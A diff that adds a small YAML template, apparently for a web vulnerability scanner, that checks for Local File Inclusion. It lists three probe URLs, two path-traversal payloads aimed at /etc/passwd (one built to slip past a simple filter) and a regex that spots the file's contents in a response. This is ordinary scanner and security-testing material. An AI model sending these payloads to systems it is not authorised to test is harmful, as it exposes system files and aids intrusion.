@@ -1,0 +1,8 @@
+name: "Local File Inclusion"
+severity: "High"
+paths:
+  - "/page.php?file={PAYLOAD}"
+  - "/index.php?page={PAYLOAD}"
+  - "/view.jsp?path={PAYLOAD}"
+payloads: ["../../etc/passwd", "....//....//etc/passwd"]
+detect_regex: "root:x:0:0|bin/bash"
